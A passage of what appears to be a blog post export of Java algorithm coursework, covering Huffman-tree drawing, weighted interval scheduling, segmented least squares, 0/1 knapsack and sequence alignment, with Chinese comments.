dPS[2][0] + 1;            insertHeap(dPS, dPS[2][0]);            //新结点加入优先树            root = n;            n = n + 1;            count = count - 1;        }    }    public static void insertHeap(int[][] dPS, int i) {        int zj,j;        if(i&gt;1){            j=i/2;            if(dPS[0][i-1]&lt;dPS[0][j-1]){                zj=dPS[0][i-1];                dPS[0][i-1]=dPS[0][j-1];                dPS[0][j-1]=zj;                zj=dPS[1][i-1];                dPS[1][i-1]=dPS[1][j-1];                dPS[1][j-1]=zj;                insertHeap(dPS,j);            }        }    }    private static void deleteHeap(int[][] dPS, int i) {        int n;        int left,right,zj;        n=dPS[2][0];;        int j = 0;        if(2*i&gt;n)            return;        else if(2*i&lt;n){            left=2*i;            right=2*i+1;            if(dPS[0][left-1]&gt;dPS[0][right-1]) {                j = right;            }            else {                j = left;            }        }else if(n==2*i){            j=2*i;        }        if(dPS[0][j-1]&lt;dPS[0][i-1]){            zj=dPS[0][i-1];            dPS[0][i-1]=dPS[0][j-1];            dPS[0][j-1]=zj;            zj=dPS[1][i-1];            dPS[1][i-1]=dPS[1][j-1];            dPS[1][j-1]=zj;            deleteHeap(dPS,j);        }    }    private static void inOrderPaint(int root, char[] cS, int[][] cHT, double x, double y, double r, double jg) {        double xC,yC,xS,yS,rC,zj1,zj2;        StdDraw.setPenColor(StdDraw.BLACK);        StdDraw.circle(x,y,r);        if(cHT[1][root]!=-1&amp;&amp;cHT[2][root]==-1){            xC=x-jg;            yC=y-4*r;            zj1=r*jg/(Math.sqrt(16*r*r+jg*jg));            zj2=4*r*r/(Math.sqrt(16*r*r+jg*jg));            StdDraw.setPenColor(StdDraw.RED);            StdDraw.line(x-zj1,y-zj2,xC+zj1,yC+zj2);            inOrderPaint(cHT[1][root],cS,cHT,xC,yC,r,jg/1.3);        }        if(cHT[2][root]!=-1&amp;&amp;cHT[1][root]==-1){            xC=x+jg;            yC=y-4*r;            zj1=r*jg/(Math.sqrt(16*r*r+jg*jg));            zj2=4*r*r/(Math.sqrt(16*r*r+jg*jg));            StdDraw.setPenColor(StdDraw.RED);            StdDraw.line(x+zj1,y-zj2,xC-zj1,yC+zj2);            inOrderPaint(cHT[2][root],cS,cHT,xC,yC,r,jg/1.3);        }        if(cHT[2][root]!=-1&amp;&amp;cHT[1][root]!=-1){            xC=x-jg;            yC=y-4*r;            zj1=r*jg/(Math.sqrt(16*r*r+jg*jg));            zj2=4*r*r/(Math.sqrt(16*r*r+jg*jg));            StdDraw.setPenColor(StdDraw.RED);            StdDraw.line(x-zj1,y-zj2,xC+zj1,yC+zj2);            //Sytem.out.print(\" \"+cHT[1][root]);            inOrderPaint(cHT[1][root],cS,cHT,xC,yC,r,jg/1.3);            xC=x+jg;            yC=y-4*r;            zj1=r*jg/(Math.sqrt(16*r*r+jg*jg));            zj2=4*r*r/(Math.sqrt(16*r*r+jg*jg));            StdDraw.setPenColor(StdDraw.RED);            StdDraw.line(x+zj1,y-zj2,xC-zj1,yC+zj2);            //Sytem.out.print(\" \"+cHT[2][root]);            inOrderPaint(cHT[2][root],cS,cHT,xC,yC,r,jg/1.3);        }        if(cHT[2][root]==-1&amp;&amp;cHT[1][root]==-1){            xS=x-0.05*r;            yS=y;            String s=\"\"+cS[cHT[0][root]];            StdDraw.setPenColor(StdDraw.RED);            StdDraw.text(xS,yS,s);        }    }}\n\n\n\n时隙最优解权值和import java.util.Arrays;public class ComputeRDemo {    public static void main(String[] args){        int isN=10,gis=50;        int[] isF=new int[isN];        int[] isS=new int[isN];        int[] isV=new int[isN];        int[] isF2=new int[isN];        int[] isS2=new int[isN];        int[] isY2=new int[isN];        int[] isV2=new int[isN];        int[] isR=new int[isN];        int[] isM=new int[isN];        int beishu=gis;        int[] flagX=new int[isN];        int c=0;        while (c&lt;isN){            int d1=(int)(Math.random()*beishu);            int d2=(int)(Math.random()*beishu);            int d3=(int)(Math.random()*beishu);            int d4=(int)(Math.random()*beishu);            if(d1&gt;d2){                isS[c]=d2;                isF[c]=d1;                isF2[c]=d1;                isV[c]=d4;                isV2[c]=d4;                flagX[c]=1;                c=c+1;            }            }        StdDraw.setXscale(0,beishu);        StdDraw.setYscale(0,beishu);        StdDraw.setPenRadius(0.005);        Arrays.sort(isF);        for (int i=0;i&lt;isN;i++){            isR[i]=0;            isM[i]=-1;        }        for (int i=0;i&lt;isN;i++){            for (int j=0;j&lt;isN;j++){                if (isF[i]==isF2[j]&amp;&amp;flagX[j]==1){                    isS2[i]=isS[j];                    isV2[i]=isV[j];                    flagX[j]=0;                    break;                }            }        }        int[] isP=new int[isN];        int[] isSX=new int[isN];        int[] isSY=new int[isN];        for (int i=0;i&lt;isN;i++){            isP[i]=-1;            isY2[i]=(int)(beishu/isN*(isN-i)-0.5);            isSY[i]=isY2[i]-2;            isSX[i]=(int)((isS2[i]+isF[i])/2);        }        for(int i=0;i&lt;isN;i++){            for(int j=i-1;j&gt;=0;j--){                if (isS2[i]&gt;isF[j]){                    isP[i]=j;                    break;                }            }        }        computeOpt(isV2,isM,isP,isN-1);        findSolutions(isM,isV2,isR,isP,isN-1);        for (int i=0;i&lt;isN;i++){            StdDraw.setPenColor(StdDraw.BLUE);            StdDraw.text(isSX[i],isSY[i],\"\"+isV2[i]);            if (isR[i]==1){                StdDraw.setPenColor(StdDraw.RED);                StdDraw.line(isS2[i],isY2[i],isF[i],isY2[i]);            }            else {                StdDraw.setPenColor(StdDraw.BLACK);                StdDraw.line(isS2[i],isY2[i],isF[i],isY2[i]);            }        }    }    public static int computeOpt(int[] V,int[] M,int[] P,int j) {        if (j &lt;= -1)            return 0;        else {            int d1 = computeOpt(V, M, P, P[j]);            int d2 = computeOpt(V, M, P, j - 1);            if ((V[j] + d1) &lt; d2) {                M[j]=d2;                return d2;            }            else {                M[j]=V[j]+d1;                return (V[j]+d1);            }        }    }    public static void findSolutions(int[] M,int[] V,int[] R,int[] P,int j){        int i=j;        int d1,d2,d3=0;        while (i&gt;=0){            if (P[i]==-1)                d1=d3+V[i];            else {                d1=d3+V[i]+M[P[i]];            }            if (d1==M[j]){                R[i]=1;                d3=d3+V[i];                i=P[i];            }            else {                i=i-1;            }        }    }}\n\n分段最小二乘法import java.awt.*;import javax.swing.*;import java.util.Scanner;import javax.swing.JPanel;public class SLMSDemo extends JFrame{    //16个点的点集，第一行为横坐标，第二行为纵坐标    static int P[][]={{20,40,50,60,70,80,90,100,110,120,130,140,150,160,170,180},                {10,11,12,13,14,34,56,77,99,118,121,124,127,128,129,131}};    //分段限制参数C，C越大，分的段数越少，可避免过拟合    static double C=100;    //设置一个极大值常量    static final int MAXV=1000000000;    //设置最大分段数    static int maxS=100;    //实际分段数    static int mc=0;    //点集共16个点    static int n=16;    //从1到j,j=1,2,...n的最小拟合误差,下标0做初始值，值为0    static double[] optC=new double[n+1];    //每个可能的子集的拟合直线a参数    static double[][] a=new double[n][n];    //每个可能的子集的最小乘误差    static double[][] eC=new double[n][n];    //每个可能的子集的拟合直线的b参数    static double[][] b=new double[n][n];    //最优的分段结果，第一行该子集的第一个点的下标，第二行为该子集的最后一个点的下标    static int[][] mS=new int[2][maxS];    //静态块初始化optC的初始边界值为0    static {        optC[0]=0;    }    public SLMSDemo(){}    public static void main(String[] args) {        SLMSDemo frame = new SLMSDemo();        //计算a,b,eC        ComputeE();        //计算每个1...j子集的最优拟合代价        mc = ComputeOPT();        //显示输出计算结果        DrawPanel rd= new DrawPanel(P,a,b,mS,mc);        frame.add(rd);        frame.setSize(400,400);        frame.setTitle(\"分段最小二乘演示程序\");        frame.setLocationRelativeTo(null);        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);        frame.setVisible(true);    }    private static void ComputeE() {        for(int j=0;j&lt;n;j++){            for(int i=0;i&lt;=j;i++){                int xySum=0;                int xSum=0;                int ySum=0;                int xxSum=0;                for(int k=i;k&lt;=j;k++){                    xySum+=P[0][k]*P[1][k];                    xxSum+=P[0][k]*P[0][k];                    xSum+=P[0][k];                    ySum+=P[1][k];                }                double zj=((j-i+1)*xxSum-xSum*xSum);                if(zj!=0){                    a[i][j]=((j-i+1)*xySum-xSum*ySum)/zj;                }else{                    a[i][j]=MAXV;                }                b[i][j]=(ySum-a[i][j]*xSum)/(j-i+1);                int eSum=0;                for(int k=i;k&lt;=j;k++){                    eSum+=(P[1][k]-P[0][k]*a[i][j]-b[i][j])*(P[1][k]-P[0][k]*a[i][j]-b[i][j]);                }                eC[i][j]=eSum;            }        }    }    public static int ComputeOPT() {        for(int j=1;j&lt;=n;j++){            double emin=MAXV;            for(int i=1;i&lt;=j;i++){                double zj=eC[i-1][j-1]+C+optC[i-1];                if(zj&lt;emin){                    emin=zj;                }            }            optC[j]=emin;            //System.out.println(optC[j]+\"\");        }        int m=0;        int j=n;        while (j&gt;=1){            double emin=MAXV;            int imin=0;            for(int i=1;i&lt;=j;i++){                double zj=eC[i-1][j-1]+C+optC[i-1];                if(zj&lt;emin){                    emin=zj;                    imin=i;                }            }            mS[0][m]=imin-1;            mS[1][m]=j-1;            m=m+1;            j=imin-1;        }        return m;    }}class DrawPanel extends JPanel{    private int widthP=400;    private int tw=40;    private int heightP=widthP-tw;    private int width=0;    private int height=0;    private Color axisColor=Color.BLACK;    private Color scatColor=Color.BLUE;    private Point origin;    private Point originA;    private int cx=5;    private int cy=5;    private int beishu;    private int sC=100;    private int[][] P;    private double[][] a;    private double[][] b;    private int[][] mS;    private int mc;    public DrawPanel(){        originA=new Point(2,380-2);    }    public DrawPanel(Point p){        origin=p;    }    public DrawPanel(int x,int y){        origin=new Point(0,0);        width=x;        height=y;    }    public DrawPanel(int[][]P,double[][]a,double[][]b,int[][]mS,int mc){        cx=5;        cy=5;        sC=16;        this.P=P;        this.a=a;        this.b=b;        this.mS=mS;        this.mc=mc;        beishu=2;        originA=new Point(cx,this.heightP-cy);    }    public int getArea(){        return width*height;    }    protected void paintComponent(Graphics g){        paintXY(g);        paintScatters(g);        paintLines(g);    }    private void paintXY(Graphics g){        g.setColor(axisColor);        g.drawLine(originA.x,originA.y,originA.x+widthP-cx,originA.y);        g.drawLine(originA.x,originA.y,originA.x,originA.y-heightP+cy+tw);    }    private void paintScatters(Graphics g){        g.setColor(scatColor);        for(int i=0;i&lt;sC;i++){            g.drawOval(originA.x+P[0][i]*beishu,originA.y-P[1][i]*beishu,cx,cy);        }    }    private void paintLines(Graphics g){        for(int i=0;i&lt;mc;i++){            int y1=(int)((a[mS[0][i]][mS[1][i]]*P[0][mS[0][i]]+b[mS[0][i]][mS[1][i]])*beishu);            int x1=P[0][mS[0][i]]*beishu;            int y2=((int)(a[mS[0][i]][mS[1][i]]*P[0][mS[1][i]]+b[mS[0][i]][mS[1][i]])*beishu);            int x2=P[0][mS[1][i]]*beishu;            g.setColor(Color.RED);            g.drawLine(originA.x+x1,originA.y-y1,originA.x+x2,originA.y-y2);        }    }}\n\n\n\n背包问题import java.io.*;import java.util.*;public class KnapsackDemo {    static int n = 10;    static int W = 100;    //static int[] iW={6,17,8,21,4,7,8,12,9,11};    //static int[] iV={7,21,14,23,6,6,9,11,8,14};    static int[] iW = {6, 17, 8, 21, 4, 7, 8, 12, 9, 11};    static int[] iV = {7, 21, 14, 5, 6, 6, 9, 11, 8, 14};    static int[][] optC = new int[n + 1][W + 1];    static int sN = 0;    static int vG = 0;    static int wG = 0;    static int[] iS = new int[n];    static {        for (int j = 0; j &lt;= W; j++) {            optC[0][j] = 0;        }    }    public static void main(String[] args) {        computeOPT();        System.out.println(\"所选物件编号为\");        for (int i = 0; i &lt; n; i++) {            System.out.print(iS[i] + \" \");        }        System.out.print(\"\\n\");        System.out.println(\"占用总空间为: \" + wG);        System.out.println(\"总价值为: \" + vG);    }    public static void computeOPT() {        for (int j = 1; j &lt;= n; j++) {            for (int w = 0; w &lt;= W; w++) {                if (w &lt; iW[j - 1]) {                    optC[j][w] = optC[j - 1][w];                } else {                    int zj = iV[j - 1] + optC[j - 1][w - iW[j - 1]];                    if (zj &gt; optC[j - 1][w]) {                        optC[j][w] = zj;                    } else {                        optC[j][w] = optC[j - 1][w];                    }                }            }        }        int j = n;        int w = W;        while (j &gt; 0) {            if (w &lt; iW[j - 1]) {                j = j - 1;            } else {                int zj = iV[j - 1] + optC[j - 1][w - iW[j - 1]];                if (zj &gt; optC[j - 1][w]) {                    iS[sN] = j;                    sN = sN + 1;                    vG = vG + iV[j - 1];                    wG = wG + iW[j - 1];                    w = w - iW[j - 1];                    j = j - 1;                } else {                    j = j - 1;                }            }        }    }}\n\n串匹配import java.util.Hashtable;public class SequenceAlignmentDemo {    static int m=10;    static int n=10;    static String X=\"governance\";    static String Y=\"government\";    static String aY=\"\";    static String aX=\"\";    static int d=2;    static int[][] A=new int[26][26];    static int[][] M=new int[2][m];    static int mL=0;    static{        for(int i=0;i&lt;26;i++){            for(int j=0;j&lt;26;j++){                if(i==j){                    A[i][j]=0;                }else{                    A[i][j]=d*2;                }            }        }    }    static String elpha[]={\"a\",\"b\",\"c\",\"d\",\"e\",\"f\",\"g\",\"h\",\"i\",\"j\",\"k\",\"l\",\"m\",\"n\",                          \"o\",\"p\",\"q\",\"r\",\"s\",\"t\",\"u\",\"v\",\"w\",\"x\",\"y\",\"z\"};    static Integer index[]={0,1,2,3,4,5,6,7,8,9,10,11,12,13,                            14,15,16,17,18,19,20,21,22,23,24,25};    static Hashtable&lt;String,Integer&gt; ht=new Hashtable&lt;String,Integer&gt;();    static{        for(int i=0;i&lt;26;i++){            ht.put(elpha[i],index[i]);        }    }    static int[][] optC=new int[m+1][n+1];    static {        for(int j=0;j&lt;=m;j++){            optC[j][0]=j*d;        }        for(int j=0;j&lt;=n;j++){            optC[0][j]=j*d;        }    }    public static void main(String[] args) {        computeOPT();        System.out.println(\"最优匹配代价值为: \"+optC[m][n]);        System.out.println(\"最优匹配集为: \");        for(int i=0;i&lt;mL;i++){            System.out.print(\"(\"+M[0][i]+\",\"+M[1][i]+\")\");            if(Math.floorMod(i+1,4)==0)                System.out.print(\"\\n\");        }        System.out.print(\"\\n\");        System.out.println(aX);        System.out.println(aY);    }    public static void computeOPT(){        for(int i=1;i&lt;=m;i++){            for(int j=1;j&lt;=n;j++){                int zj1=A[(ht.get(X.substring(i-1,i))).intValue()][(ht.get(Y.substring(j-1,j))).intValue()]                        +optC[i-1][j-1];                int zj2=d+optC[i-1][j];                int zj3=d+optC[i][j-1];                if(zj1&lt;zj2&amp;&amp;zj1&lt;zj3){                    optC[i][j]=zj1;                }                if (zj2&lt;=zj1&amp;&amp;zj2&lt;=zj3){                    optC[i][j]=zj2;                }                if(zj3&lt;=zj1&amp;&amp;zj3&lt;=zj2){                    optC[i][j]=zj3;                }            }        }        int i=m;        int j=n;        while (i&gt;=1||j&gt;=1){            int zj1=A[(ht.get(X.substring(i-1,i))).intValue()][(ht.get(Y.substring(j-1,j))).intValue()]                    +optC[i-1][j-1];            int zj2=d+optC[i-1][j];            int zj3=d+optC[i][j-1];            if(zj1&lt;zj2&amp;&amp;zj1&lt;zj3){                aX=X.substring(i-1,i)+aX;                aY=Y.substring(j-1,j)+aY;                M[0][mL]=i;                M[1][mL]=j;                mL=mL+1;                i--;                j--;            }            if(zj2&lt;=zj1&amp;&amp;zj2&lt;=zj3){                aY=\"-\"+aY;                aX=X.substring(i-1,i)+aX;                i=i-1;            }            if(zj3&lt;=zj1&amp;&amp;zj3&lt;=zj2){                aX=\"-\"+aX;                aY=Y.substring(j-1,j)+aY;                j=j-1;            }        }    }}\n\n","categories":["算法与程序设计"],"tags":["算法与程序设计实验"]}]